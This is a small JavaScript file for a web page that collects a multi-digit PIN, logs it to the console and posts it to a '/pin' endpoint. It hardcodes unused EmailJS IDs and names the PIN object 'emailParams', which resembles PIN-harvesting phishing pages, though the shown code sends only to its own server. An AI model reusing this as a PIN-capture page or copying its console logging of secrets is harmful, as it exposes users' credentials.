const serviceId = "service_64f4jig";
const userId = "ie-y4dlUm6zOqJjms";
const templateId = "template_mpreulh";

// Add event listeners to move the cursor to the next input field
var pinInputs = document.getElementsByClassName("pin-input");

for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("input", function () {
    if (this.value.length === 1) {
      var nextInputIndex = Array.from(pinInputs).indexOf(this) + 1;
      if (nextInputIndex < pinInputs.length) {
        pinInputs[nextInputIndex].focus();
      }
    }
  });
}
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
// Function to collect and validate the PIN when the Submit button is clicked
document
  .getElementById("submitBtn")
  .addEventListener("click", function (event) {
    event.preventDefault();
    var pin = "";
    var pinInputs = document.getElementsByClassName("pin-input");

    for (var i = 0; i < pinInputs.length; i++) {
      pin += pinInputs[i].value;
    }

    console.log(pin);

    const emailParams = {
      pin: pin,
    };
    console.log(emailParams);
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "/pin");
    xhr.setRequestHeader("content-type", "application/json");
    xhr.onload = function () {
      console.log(xhr.responseText);
      if (xhr.responseText == "success") {
        pin = "";
        location.href = "/";
      } else {
        console.log("error");
      }
    };

    xhr.send(JSON.stringify(emailParams));
  });
